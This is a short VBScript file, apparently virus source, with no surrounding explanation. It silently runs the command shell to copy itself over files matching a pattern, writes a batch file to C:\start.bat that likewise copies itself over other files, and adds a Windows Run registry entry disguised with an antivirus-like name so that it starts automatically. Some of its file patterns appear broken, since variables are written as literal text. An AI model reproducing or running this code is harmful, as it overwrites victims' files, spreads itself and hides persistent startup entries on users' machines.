   Set WshShell = Wscript.CreateObject("Wscript.Shell")
   Set WshSysEnv = WshShell.Environment("Process")
   CP = WshSysEnv("comspec")
   dmx = vbs
   WshShell.Run (CP & " /c for %%v in (*.dmx) do copy /y " & Wscript.ScriptFullName & " %%v>nul"), vbHide
   Set batvir = CreateObject("Scripting.FileSystemObject")
   set bat =batvir.CreateTextFile("C:\start.bat")
   bat.WriteLine "@echo off"
   bat.WriteLine"set matresh=bat"
   bat.WriteLine "for %%b in (*.matresh) do if not %%b==AUTOEXEC.BAT copy %0 %%b>nul"
   bat.WriteLine "echo on"
   bat.Close
   Set WSHShell = WScript.CreateObject("WScript.Shell")
   WSHShell.RegWrite"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\avp.0","C:\start.bat", "REG_SZ"
